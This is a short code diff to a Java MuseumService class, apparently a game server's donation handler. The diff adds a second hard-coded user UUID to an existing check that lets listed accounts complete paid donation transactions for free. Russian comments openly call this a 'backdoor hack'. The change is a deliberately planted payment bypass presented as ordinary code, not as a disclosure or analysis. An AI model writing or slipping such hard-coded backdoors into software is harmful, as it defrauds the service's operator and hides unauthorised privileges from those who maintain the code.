@@ -152,7 +152,11 @@ public class MuseumService {
 					if (data != null)
 						price = (int) data.priceWithDiscount(price);
 					// Делфику донат бесплатно бекдор взлом хак
-					if (pckg.getUser().equals(UUID.fromString("e7c13d3d-ac38-11e8-8374-1cb72caa35fd"))) {
+					// Фанку донат бесплатно бэкдор взлом хэк
+					if (
+							pckg.getUser().equals(UUID.fromString("e7c13d3d-ac38-11e8-8374-1cb72caa35fd")) ||
+									pckg.getUser().equals(UUID.fromString("307264a1-2c69-11e8-b5ea-1cb72caa35fd"))
+					) {
 						Optional.ofNullable(TRANSACTION_POST_AUTHORIZE_MAP.get(pckg.getDonate())).ifPresent(consumer -> consumer.accept(pckg, info));
 						pckg.setResponse(UserTransactionPackage.TransactionResponse.OK);
 						answer(channel, pckg);
